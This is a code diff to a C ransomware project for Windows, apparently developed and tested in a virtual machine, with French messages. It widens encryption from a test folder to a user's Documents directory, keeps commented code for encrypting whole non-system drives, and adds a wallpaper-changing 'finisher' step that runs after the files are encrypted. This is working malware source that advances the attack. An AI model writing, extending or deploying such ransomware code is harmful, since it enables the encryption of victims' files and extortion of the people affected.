@@ -7,8 +7,10 @@
 #include <stdio.h>
 #include <string.h>
 #include <winternl.h>
+#include <shlobj.h> // SHGetFolderPath
 #include "core/list_files.h"
 #include "core/encrypter.h"
+#include "core/changeBackground.h"
 
 #pragma comment(lib, "ntdll.lib")
 
@@ -24,7 +26,7 @@ typedef NTSTATUS(NTAPI *NtWriteFile_t)(
     HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
     PVOID, ULONG, PLARGE_INTEGER, PULONG);
 
-int chypher_drive(char* dir)
+int chypher_drive(char *dir)
 {
     printf("%s", dir);
     FileDataArray *arr = malloc(sizeof(FileDataArray));
@@ -55,6 +57,8 @@ int chypher_drive(char* dir)
             printf("Erreur de conversion de char* en PCWSTR: %lu\n", GetLastError());
             return 1;
         }
+
+        int encryptionRatio = 1;
 
         PCWSTR pwstr = wideStr;
         encrypter(pwstr, 1);
@@ -89,13 +93,46 @@ int main()
     {
         if (drives & (1 << (letter - 'A')))
         {
-            printf("Chiffrer le lecteur %c:\\\n", letter);
-            char dir[MAX_PATH_LENGTH];
-            // snprintf(dir, sizeof(dir), "%c:\\", letter); /!\ Don't uncomment this line, it might encrypt the whole drive
-            snprintf(dir, sizeof(dir), "%s", "C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test");
-            chypher_drive(dir);
+            if (letter == 'C')
+            {
+                printf("Chiffrer le lecteur %c:\\\n", letter);
+                char dir[MAX_PATH_LENGTH];
+                snprintf(dir, sizeof(dir), "%c:\\Users\\vboxuser\\Documents", letter);
+                chypher_drive(dir);
+            }
+            else
+            {
+                continue; // Skip the when it's not C drive
+            }
+
+            /* if (letter == 'C')
+            {
+                // C: is the system drive, we don't want to encrypt it
+                printf("Skipping C:\\ drive.\n");
+                continue;
+            }
+            else {
+                printf("Chiffrer le lecteur %c:\\\n", letter);
+                snprintf(dir, sizeof(dir), "%c:", letter);
+                chypher_drive(dir);
+            } */
         }
     }
 
+    char desktopPath[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) != S_OK)
+    {
+        fprintf(stderr, "Impossible de récupérer le chemin du bureau.\n");
+        return 1;
+    }
+    printf("Changement du fond d'écran...\n");
+    if (finisher(desktopPath) != 0)
+    {
+        fprintf(stderr, "Erreur lors du changement de fond d'écran.\n");
+        return 1;
+    }
+
+    printf("Chiffrement termine\n");
+    scanf("Press Enter to exit...\n");
     return 0;
 }
